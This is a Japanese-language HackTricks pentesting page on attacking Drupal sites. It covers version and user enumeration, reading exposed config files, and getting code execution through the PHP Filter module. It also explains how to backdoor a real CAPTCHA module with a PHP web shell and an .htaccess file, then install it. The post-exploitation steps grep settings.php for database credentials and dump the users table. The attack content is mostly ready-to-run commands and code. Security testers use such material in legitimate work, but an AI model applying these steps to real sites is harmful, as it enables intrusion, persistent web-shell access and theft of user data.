# Drupal

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter**で**フォロー**する 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングトリックを共有するために、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Discovery

* **meta**をチェック
```bash
curl https://www.drupal.org/ | grep 'content="Drupal'
```
* **Node**: Drupal **はノードを使用してコンテンツをインデックス化**します。ノードにはブログ投稿、投票、記事など、**何でも保持**できます。ページのURIは通常、`/node/<nodeid>`の形式です。
```bash
curl drupal-site.com/node/1
```
## 列挙

Drupalはデフォルトで**3種類のユーザー**をサポートしています:

1. **`管理者`**: このユーザーはDrupalウェブサイト全体を完全に制御できます。
2. **`認証ユーザー`**: これらのユーザーはウェブサイトにログインし、権限に基づいて記事の追加や編集などの操作を行うことができます。
3. **`匿名`**: すべてのウェブサイト訪問者は匿名として指定されます。デフォルトでは、これらのユーザーは投稿を読むことしか許可されていません。

### バージョン

* `/CHANGELOG.txt`をチェック
```bash
curl -s http://drupal-site.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```
{% hint style="info" %}
Drupalの新しいインストールでは、デフォルトで`CHANGELOG.txt`と`README.txt`ファイルへのアクセスがブロックされています。
{% endhint %}

### ユーザー名の列挙

#### 登録

_ /user/register_ でユーザー名を作成しようとすると、すでに使用されている名前の場合に通知されます：

![](<../../.gitbook/assets/image (328).png>)

#### 新しいパスワードのリクエスト

既存のユーザー名に対して新しいパスワードをリクエストする場合：

![](<../../.gitbook/assets/image (903).png>)

存在しないユーザー名に対して新しいパスワードをリクエストする場合：

![](<../../.gitbook/assets/image (307).png>)

### ユーザー数の取得

_ /user/\<number>_ にアクセスすると、既存のユーザー数を確認できます。この場合、_ /users/3_ は見つかりませんのエラーを返します：

![](<../../.gitbook/assets/image (333).png>)

![](<../../.gitbook/assets/image (227) (1) (1) (1).png>)

### 非表示ページ

**`/node/$` と入力し、`$` には数字が入ります**（たとえば1から500まで）。\
検索エンジンによって参照されていない**非表示ページ**（テスト、開発）を見つけることができます。

#### インストールされたモジュールの情報
```bash
#From https://twitter.com/intigriti/status/1439192489093644292/photo/1
#Get info on installed modules
curl https://example.com/config/sync/core.extension.yml
curl https://example.com/core/core.services.yml

# Download content from files exposed in the previous step
curl https://example.com/config/sync/swiftmailer.transport.yml
```
### 自動
```bash
droopescan scan drupal -u http://drupal-site.local
```
## RCE

### PHPフィルターモジュールを使用する

{% hint style="warning" %}
Drupalの古いバージョン**(バージョン8より前)**では、管理者としてログインし、`PHP filter`モジュールを**有効にする**ことが可能でした。このモジュールは「埋め込みPHPコード/スニペットを評価する」ことができます。
{% endhint %}

**プラグインphpがインストールされている必要があります**（_/_modules/php_にアクセスして**403**が返された場合は**存在します**、**見つからない**場合は**プラグインphpがインストールされていません**）

_Modules_に移動 -> (**Check**) _PHP Filter_を選択 -> _Save configuration_

![](<../../.gitbook/assets/image (247) (1).png>)

その後、_Add content_をクリック -> _Basic Page_または_Article_を選択 -> _本文にphpシェルコードを記述_ -> _Text format_で_PHP code_を選択 -> _Preview_を選択

![](<../../.gitbook/assets/image (338).png>)

最後に、新しく作成したノードにアクセスしてください：
```bash
curl http://drupal-site.local/node/3
```
### PHPフィルターモジュールのインストール

**バージョン8以降では、**[**PHPフィルター**](https://www.drupal.org/project/php/releases/8.x-1.1)**モジュールはデフォルトでインストールされていません**。この機能を活用するには、**モジュールを自分でインストールする必要があります**。

1. Drupalのウェブサイトからモジュールの最新バージョンをダウンロードします。
2. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
3. ダウンロードが完了したら、**`管理`** > **`レポート`** > **`利用可能な更新`**に移動します。
4. **`参照`**をクリックし、ダウンロードしたディレクトリ内のファイルを選択して、**`インストール`**をクリックします。
5. モジュールがインストールされたら、**`コンテンツ`**をクリックして、Drupal 7の例と同様に**新しい基本ページを作成**します。再度、**`テキスト形式`のドロップダウンから`PHPコード`を選択**することを忘れないでください。

### バックドア付きモジュール

バックドア付きモジュールは、**既存のモジュールにシェルを追加することで作成**できます。モジュールはdrupal.orgのウェブサイトで見つけることができます。[CAPTCHA](https://www.drupal.org/project/captcha)などのモジュールを選択しましょう。tar.gz形式の[アーカイブ](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz)のリンクをコピーします。

* アーカイブをダウンロードして、その内容を抽出します。
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* 以下の内容で **PHPウェブシェル** を作成します：
```php
<?php
system($_GET["cmd"]);
?>
```
* 次に、フォルダへのアクセス権を自分自身に与えるために **`.htaccess`** ファイルを作成する必要があります。これは、Drupalが **`/modules`** フォルダへの直接アクセスを拒否するために必要です。
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* 上記の設定は、/modules内のファイルをリクエストしたときに/folderにルールを適用します。これらのファイルをcaptchaフォルダにコピーして、アーカイブを作成してください。
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* ウェブサイトに **管理アクセス** があると仮定して、サイドバーの **`管理`** をクリックし、次に **`拡張`** をクリックします。その後、**`+ 新しいモジュールをインストール`** ボタンをクリックし、インストールページに移動します。例：`http://drupal-site.local/admin/modules/install` バックドア付きの Captcha アーカイブを参照して **`インストール`** をクリックします。
* インストールが成功したら、**`/modules/captcha/shell.php`** に移動してコマンドを実行します。

## ポストエクスプロイテーション

### settings.php を読む
```
find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
```
### DBからユーザーをダンプする
```
mysql -u drupaluser --password='2r9u8hu23t532erew' -e 'use drupal; select * from users'
```
## 参考文献

* [https://academy.hackthebox.com/module/113/section/1209](https://academy.hackthebox.com/module/113/section/1209)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい** または **HackTricksをPDFでダウンロードしたい場合は** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) または [**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live) をフォローする。
* **HackTricks** および **HackTricks Cloud** のGitHubリポジトリにPRを提出して、あなたのハッキングテクニックを共有してください。

</details>
